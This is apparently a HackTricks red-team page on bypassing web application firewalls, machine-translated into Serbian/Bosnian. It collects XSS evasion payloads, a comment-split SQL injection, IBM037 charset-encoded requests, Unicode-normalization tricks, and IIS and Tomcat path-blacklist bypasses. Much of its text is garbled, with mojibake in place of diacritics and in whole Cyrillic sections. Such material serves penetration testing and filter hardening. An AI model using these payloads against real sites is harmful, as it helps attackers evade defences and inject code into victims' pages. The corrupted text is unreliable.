# Bypassovanje WAF-a

<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naƒçini podr≈°ke HackTricks-u:

* Ako ≈æelite da vidite **va≈°u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Bypassovanje Regex-a

Razliƒçite tehnike se mogu koristiti za zaobila≈æenje regex filtera na firewall-ima. Primeri ukljuƒçuju smenjivanje velikih i malih slova, dodavanje preloma linije i enkodiranje payload-a. Resursi za razliƒçite naƒçine zaobila≈æenja se mogu pronaƒái na [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads) i [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XSS\_Filter\_Evasion\_Cheat\_Sheet.html). Primeri ispod su preuzeti iz [ovog ƒçlanka](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2).
```bash
<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
<<script>alert(XSS)</script> #prepending an additional "<"
<script>alert(XSS) // #removing the closing tag
<script>alert`XSS`</script> #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
<iframe src=http://malicous.com < #double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
<iframe src="javascript:alert(`xss`)"> #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
```
## Kodiranje karaktera

Kodiranje karaktera je proces pretvaranja znakova u odgovarajuƒáe binarne reprezentacije. U kontekstu zaobila≈æenja WAF-a, mo≈æete iskoristiti razliƒçite kodne skupove kako biste zaobi≈°li detekciju WAF-a.

### URL kodiranje

URL kodiranje se koristi za pretvaranje specijalnih znakova u njihove ekvivalentne heksadecimalne vrednosti. Na taj naƒçin, znakovi koji bi mogli biti blokirani ili filtrirani od strane WAF-a mogu proƒái neprimeƒáeno.

Primjer:

Originalni URL: `http://www.example.com/page?param=value`

URL kodiranje: `http%3A%2F%2Fwww.example.com%2Fpage%3Fparam%3Dvalue`

### HTML kodiranje

HTML kodiranje se koristi za pretvaranje specijalnih znakova u njihove ekvivalentne HTML entitete. Ovo mo≈æe biti korisno za zaobila≈æenje WAF-a koji filtrira HTML oznake ili specifiƒçne znakove.

Primjer:

Originalni tekst: `<script>alert('XSS')</script>`

HTML kodiranje: `&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;`

### Unicode kodiranje

Unicode kodiranje se koristi za pretvaranje znakova u njihove ekvivalentne Unicode vrednosti. Ovo mo≈æe biti korisno za zaobila≈æenje WAF-a koji filtrira specifiƒçne znakove ili kodne skupove.

Primjer:

Originalni tekst: `SELECT * FROM users WHERE username = 'admin'`

Unicode kodiranje: `SELECT * FROM users WHERE username = '\u0061\u0064\u006d\u0069\u006e'`

### Punycode kodiranje

Punycode kodiranje se koristi za pretvaranje domena koji sadr≈æe Unicode znakove u ASCII reprezentaciju. Ovo mo≈æe biti korisno za zaobila≈æenje WAF-a koji blokira ili filtrira domene sa specifiƒçnim znakovima.

Primjer:

Originalni domen: `http://www.√©xample.com`

Punycode kodiranje: `http://www.xn--xample-9uf.com`
```bash
# Charset encoding
application/x-www-form-urlencoded;charset=ibm037
multipart/form-data; charset=ibm037,boundary=blah
multipart/form-data; boundary=blah; charset=ibm037

##Python code
import urllib
s = 'payload'
print(urllib.parse.quote_plus(s.encode("IBM037")))

## Request example
GET / HTTP/1.1
Host: buggy
Content-Type: application/x-www-form-urlencoded; charset=ibm500
Content-Length: 61

%86%89%93%85%95%81%94%85=KKaKKa%C6%D3%C1%C7K%A3%A7%A3&x=L%A7n
```
## Obfuskacija

Obfuskacija je tehnika koja se koristi za prikrivanje ili zamagljivanje stvarnog koda ili podataka kako bi se izbjeglo otkrivanje ili detekcija. Ova tehnika se ƒçesto koristi za zaobila≈æenje Web Application Firewall (WAF) sistema.

### Tehnike obfuskacije

1. **Minifikacija**: Minifikacija je proces smanjivanja veliƒçine koda uklanjanjem nepotrebnih znakova, razmaka i komentara. Ovo ƒçini kod manje ƒçitljivim i te≈æe razumljivim za ljude, ali ne utjeƒçe na funkcionalnost koda.

2. **Enkripcija**: Enkripcija se koristi za pretvaranje ƒçitljivog koda u neƒçitljivi oblik pomoƒáu algoritama enkripcije. Ovaj oblik koda se zatim dekriptira na ciljnom serveru prije izvr≈°avanja.

3. **Polimorfizam**: Polimorfizam je tehnika koja mijenja oblik koda tako da svaka instanca izgleda drugaƒçije, ali ima istu funkcionalnost. Ovo ote≈æava detekciju i analizu koda.

4. **Steganografija**: Steganografija je tehnika skrivanja podataka unutar drugih podataka, kao ≈°to su slike ili zvukovi. U kontekstu obfuskacije, ova tehnika se koristi za skrivanje zlonamjernog koda unutar legitimnih datoteka.

### Bypassing WAF putem obfuskacije

Kori≈°tenje obfuskacije mo≈æe biti korisno za zaobila≈æenje WAF sistema. Evo nekoliko tehnika koje se mogu koristiti:

1. **Obfuskacija URL-a**: Promjena URL-a tako da se izbjegne detekcija WAF-a. Ovo se mo≈æe postiƒái dodavanjem sluƒçajnih znakova, enkodiranjem URL-a ili kori≈°tenjem kratkih URL-ova.

2. **Obfuskacija parametara**: Enkodiranje ili enkripcija parametara kako bi se izbjeglo otkrivanje zlonamjernih aktivnosti.

3. **Obfuskacija HTTP zaglavlja**: Promjena ili dodavanje dodatnih zaglavlja kako bi se izbjegla detekcija WAF-a.

4. **Obfuskacija HTTP tijela**: Enkodiranje ili enkripcija HTTP tijela kako bi se izbjeglo otkrivanje zlonamjernog sadr≈æaja.

Va≈æno je napomenuti da obfuskacija nije uvijek 100% efikasna i da se WAF sistemi stalno razvijaju kako bi prepoznali nove tehnike obfuskacije. Stoga je va≈æno redovito a≈æurirati svoje tehnike i pratiti najnovije razvoje u oblasti WAF-a.
```bash
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```
## Unicode kompatibilnost

Zavisno od implementacije normalizacije Unicode-a (vi≈°e informacija [ovde](https://jlajara.gitlab.io/Bypass\_WAF\_Unicode)), karakteri koji dele Unicode kompatibilnost mogu zaobiƒái WAF i izvr≈°iti se kao namereni payload. Kompatibilni karakteri se mogu pronaƒái [ovde](https://www.compart.com/en/unicode)

### Primer
```bash
# under the NFKD normalization algorithm, the characters on the left translate
# to the XSS payload on the right
Ôºúimg src‚Åºp onerror‚ÅºÔºáprompt‚ÅΩ1‚ÅæÔºáÔπ•  --> Ôºúimg src=p onerror='prompt(1)'>
```
## –ü—Ä–µ–≤–∞–∑–∏–ª–∞–∂–µ—ö–µ –æ–≥—Ä–∞–Ω–∏—á–µ—ö–∞ –≤–µ–ª–∏—á–∏–Ω–µ

–£–æ–±–∏—á–∞—ò–µ–Ω–æ —ò–µ —É WAF-–æ–≤–∏–º –±–∞–∑–∏—Ä–∞–Ω–∏–º –Ω–∞ –æ–±–ª–∞–∫—É –¥–∞ –∞–∫–æ —ò–µ –ø–æ–ª–µ–∑–Ω–æ—Å—Ç –≤–µ—õ–∞ –æ–¥ X –≤–µ–ª–∏—á–∏–Ω–µ, –∑–∞—Ö—Ç–µ–≤ –Ω–µ—õ–µ –±–∏—Ç–∏ –ø—Ä–æ–≤–µ—Ä–µ–Ω –æ–¥ —Å—Ç—Ä–∞–Ω–µ WAF-–∞. –ú–æ–∂–µ—Ç–µ —ò–µ–¥–Ω–æ—Å—Ç–∞–≤–Ω–æ –∫–æ—Ä–∏—Å—Ç–∏—Ç–∏ —Ç–æ –¥–∞ –∏—Ö –ø—Ä–µ–≤–∞–∑–∏—í–µ—Ç–µ.

### –†–æ—Ç–∞—Ü–∏—ò–∞ IP –∞–¥—Ä–µ—Å–∞

* [https://github.com/rootcathacking/catspin](https://github.com/rootcathacking/catspin)

<details>

<summary><strong>–ù–∞—É—á–∏—Ç–µ —Ö–∞–∫–æ–≤–∞—ö–µ AWS-–∞ –æ–¥ –Ω—É–ª–µ –¥–æ —Ö–µ—Ä–æ—ò–∞ —Å–∞</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–î—Ä—É–≥–∏ –Ω–∞—á–∏–Ω–∏ –¥–∞ –ø–æ–¥—Ä–∂–∏—Ç–µ HackTricks:

* –ê–∫–æ –∂–µ–ª–∏—Ç–µ –¥–∞ –≤–∏–¥–∏—Ç–µ —Å–≤–æ—ò—É **–∫–æ–º–ø–∞–Ω–∏—ò—É —Ä–µ–∫–ª–∞–º–∏—Ä–∞–Ω—É –Ω–∞ HackTricks** –∏–ª–∏ **–ø—Ä–µ—É–∑–º–µ—Ç–µ HackTricks —É PDF —Ñ–æ—Ä–º–∞—Ç—É** –ü—Ä–æ–≤–µ—Ä–∏—Ç–µ [**–ü–†–ï–¢–ü–õ–ê–¢–ù–ï –ü–õ–ê–ù–û–í–ï**](https://github.com/sponsors/carlospolop)!
* –ù–∞–±–∞–≤–∏—Ç–µ [**–∑–≤–∞–Ω–∏—á–Ω–∏ PEASS & HackTricks —Å—É–≤–µ–Ω–∏—Ä**](https://peass.creator-spring.com)
* –û—Ç–∫—Ä–∏—ò—Ç–µ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü–∏—ò—É –µ–∫—Å–∫–ª—É–∑–∏–≤–Ω–∏—Ö [**NFT-–æ–≤–∞**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏–¥—Ä—É–∂–∏—Ç–µ —Å–µ** üí¨ [**Discord –≥—Ä—É–ø–∏**](https://discord.gg/hRep4RUj7f) –∏–ª–∏ [**—Ç–µ–ª–µ–≥—Ä–∞–º –≥—Ä—É–ø–∏**](https://t.me/peass) –∏–ª–∏ **–ø—Ä–∞—Ç–∏—Ç–µ** –Ω–∞—Å –Ω–∞ **Twitter-—É** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥–µ–ª–∏—Ç–µ —Å–≤–æ—ò–µ —Ö–∞–∫–µ—Ä—Å–∫–µ —Ç—Ä–∏–∫–æ–≤–µ —Å–ª–∞—ö–µ–º PR-–æ–≤–∞ –Ω–∞** [**HackTricks**](https://github.com/carlospolop/hacktricks) –∏ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏—ò—É–º–µ.

</details>
